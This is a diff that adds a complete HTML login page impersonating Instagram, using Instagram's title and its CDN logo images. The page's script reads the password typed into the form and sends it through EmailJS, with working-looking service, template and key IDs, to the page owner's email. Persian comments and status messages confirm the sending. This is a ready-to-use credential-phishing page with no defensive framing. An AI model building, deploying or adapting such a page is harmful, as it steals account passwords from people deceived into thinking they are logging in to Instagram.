@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>instagram  — Log in</title>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<style>
+  :root{
+    --bg: #161b22;
+    --card-border: #3a3f47;
+    --text-main: #f5f6f7;
+    --text-muted: #8a8f98;
+    --accent-blue: #1877f2;
+    --accent-blue-hover: #1467d6;
+  }
+
+  *{ box-sizing: border-box; }
+
+  body{
+    margin:0;
+    min-height:100vh;
+    background: var(--bg);
+    font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: var(--text-main);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding: 24px;
+  }
+
+  .screen{
+    width:100%;
+    max-width:400px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+  }
+
+  .back-arrow{
+    align-self:flex-start;
+    font-size:22px;
+    color: var(--text-main);
+    margin-bottom: 40px;
+    cursor:pointer;
+    user-select:none;
+  }
+
+  .logo-wrap{
+    width:110px;
+    height:110px;
+    margin: 20px 0 60px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  /* Replace the src below with the URL to your own brand logo */
+  .logo-wrap img{
+    width:100%;
+    height:100%;
+    object-fit:contain;
+    border-radius: 22px;
+  }
+
+  form{
+    width:100%;
+    display:flex;
+    flex-direction:column;
+    gap:16px;
+  }
+
+  input{
+    width:100%;
+    padding: 16px 18px;
+    border-radius: 12px;
+    border: 1px solid var(--card-border);
+    background: transparent;
+    color: var(--text-main);
+    font-size: 16px;
+    outline:none;
+  }
+
+  input::placeholder{
+    color: var(--text-muted);
+  }
+
+  input:focus{
+    border-color: var(--accent-blue);
+  }
+
+  .login-btn{
+    margin-top: 8px;
+    width:100%;
+    padding: 16px;
+    border:none;
+    border-radius: 30px;
+    background: var(--accent-blue);
+    color:#fff;
+    font-size:17px;
+    font-weight:600;
+    cursor:pointer;
+    transition: background 0.15s ease;
+  }
+
+  .login-btn:hover{
+    background: var(--accent-blue-hover);
+  }
+
+  .forgot-link{
+    margin-top: 26px;
+    text-align:center;
+    color: var(--text-main);
+    font-weight:700;
+    font-size:16px;
+    text-decoration:none;
+    cursor:pointer;
+  }
+
+  .spacer{
+    flex:1;
+    min-height: 60px;
+  }
+
+  .create-account-btn{
+    width:100%;
+    padding: 16px;
+    border-radius: 30px;
+    border: 1px solid var(--accent-blue);
+    background: transparent;
+    color: var(--accent-blue);
+    font-size:17px;
+    font-weight:600;
+    text-align:center;
+    cursor:pointer;
+    margin-top: 40px;
+  }
+
+  .brand-footer{
+    margin-top: 28px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  .brand-footer img{
+    height: 26px;
+    max-width: 160px;
+    object-fit: contain;
+  }
+</style>
+</head>
+<body>
+
+  <div class="screen">
+   
+
+    <div class="logo-wrap">
+      <!-- Put the URL to your own logo here -->
+      <img src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Logo" onerror="this.style.display='none'; this.parentElement.innerHTML+='<div style=\'color:#8a8f98;font-size:14px;text-align:center\'>Your logo here</div>'">
+    </div>
+
+    <form onsubmit="event.preventDefault();">
+      <input type="text" placeholder="Username, email address or mobile number" required>
+      <input type="password" id="message" placeholder="Password" required>
+      <button type="submit" class="login-btn" id="sendBtn">Log in</button>
+      <div id="status"></div>
+    </form>
+
+    <a class="forgot-link">Forgotten password?</a>
+
+    <div class="spacer"></div>
+
+    <div class="create-account-btn">Create new account</div>
+    <script>
+      // ================== تنظیمات EmailJS ==================
+      // این سه مقدار رو از پنل emailjs.com بردار و اینجا جایگزین کن
+      const PUBLIC_KEY  = "4sBQXocECkOiVRHc3";
+      const SERVICE_ID  = "service_f7gfmac";
+      const TEMPLATE_ID = "template_h0ch56c";
+      // =======================================================
+    
+      emailjs.init(PUBLIC_KEY);
+    
+      const btn = document.getElementById("sendBtn");
+      const status = document.getElementById("status");
+      const textarea = document.getElementById("message");
+    
+      btn.addEventListener("click", () => {
+        const text = textarea.value.trim();
+        if (!text) {
+          status.textContent = "لطفاً یک متن بنویس.";
+          status.className = "err";
+          return;
+        }
+    
+        btn.disabled = true;
+        status.textContent = "در حال ارسال...";
+        status.className = "";
+    
+        emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+          message: text,
+          time: new Date().toLocaleString("fa-IR")
+        }).then(() => {
+          status.textContent = "با موفقیت ارسال شد ✅";
+          status.className = "ok";
+          textarea.value = "";
+          btn.disabled = false;
+        }).catch((err) => {
+          console.error(err);
+          status.textContent = "خطا در ارسال. دوباره تلاش کن.";
+          status.className = "err";
+          btn.disabled = false;
+        });
+      });
+    </script>
+    <div class="brand-footer">
+      <!-- Put the URL to your bottom logo (footer brand mark) here -->
+      <img src="https://static.cdninstagram.com/rsrc.php/yy/r/zVM9V9EU5f1.svg" alt="farshad" onerror="this.style.display='none'; this.parentElement.innerHTML+='<span style=\'color:#8a8f98;font-size:13px\'>Your footer logo here</span>'">
+    </div>
+  </div>
+
+</body>
+</html>
